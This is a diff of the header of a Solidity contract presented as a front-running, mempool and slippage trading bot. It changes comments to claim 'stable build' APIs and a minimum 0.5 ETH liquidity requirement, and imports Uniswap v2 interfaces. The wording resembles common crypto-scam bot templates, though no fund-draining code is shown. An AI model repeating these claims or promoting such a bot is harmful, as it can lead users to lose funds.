@@ -1,8 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
-// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
-// Import Libraries Migrator/Exchange/Factory
+// User guide info, updated build
+// Testnet transactions will fail because they have no value in them
+// FrontRun api stable build
+// Mempool api stable build
+// BOT updated build
+// Min liquidity after gas fees has to equal 0.5 ETH //
+
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
